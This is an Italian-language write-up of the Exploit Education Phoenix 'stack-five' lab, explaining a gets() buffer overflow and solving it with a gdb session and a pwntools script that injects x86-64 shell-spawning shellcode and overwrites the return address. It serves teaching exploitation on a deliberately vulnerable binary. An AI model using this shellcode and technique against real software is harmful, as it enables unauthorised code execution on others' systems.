### Descrizione del Codice

Il programma `stack_five.c` presenta una vulnerabilità di overflow del buffer che può essere sfruttata per eseguire codice arbitrario, noto come "shellcode".

### Funzionamento del Programma

1. Il programma legge un input dall'utente utilizzando la funzione `gets` e lo memorizza in `buffer`.
2. La funzione `gets` non controlla la lunghezza dell'input, il che può causare un overflow del buffer.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `gets` senza controllare la lunghezza dell'input, il che può causare un overflow del buffer. Questo può essere sfruttato per inserire una shellcode nel buffer e reindirizzare l'esecuzione del codice a questa shellcode.

### Exploit

L'exploit sfrutta l'overflow del buffer per inserire una shellcode nel buffer e reindirizzare l'esecuzione del codice a questa shellcode.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

Qui non abbiamo alcuna funzione a cui saltare, ma abbiamo un buffer abbastanza grande da contenere una shellcode.

L'idea è di inserire la nostra shellcode nel buffer e restituire l'esecuzione ad essa.

Quindi dobbiamo inserire: (shellcode + riempimento per riempire il buffer + 8 byte per RBP + RIP con l'indirizzo del buffer).

Quando si lavora con la shellcode, è una buona idea disattivare alcune variabili d'ambiente che gdb aggiunge per saltare all'indirizzo corretto.

$ gdb -q /opt/phoenix/amd64/stack-five
Reading symbols from /opt/phoenix/amd64/stack-five...(no debugging symbols found)...done.

gef➤  unset env LINES
gef➤  unset env COLUMNS
gef➤  disassemble start_level 
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave  
   0x00000000004005a3 <+22>:	ret    

La dimensione del buffer è 0x80 = 128 byte.

Ora mettiamo un breakpoint alla funzione gets per ottenere l'indirizzo del buffer.

gef➤  b *0x000000000040059c
Breakpoint 1 at 0x40059c

gef➤  r
Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

gef➤  print $rbp-0x80
$1 = (void *) 0x7fffffffe5d0

L'indirizzo del buffer è 0x7fffffffe5d0.

Ora abbiamo tutti i pezzi per scrivere l'exploit.

Soluzione:
# solve.py

from pwn import *

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

buff = ""
buff += '\x90'*30  # NOP Sled
buff += shellcode  # shellcode
buff += 'A'* (128 - len(buff))  # riempimento
buff += 'BBBBBBBB'  # valore RBP
buff += p64(0x7fffffffe5d0)  # valore RIP (indirizzo del buffer)

print(buff)

Eseguiamo:

$ (python solve.py; cat) | /opt/phoenix/amd64/stack-five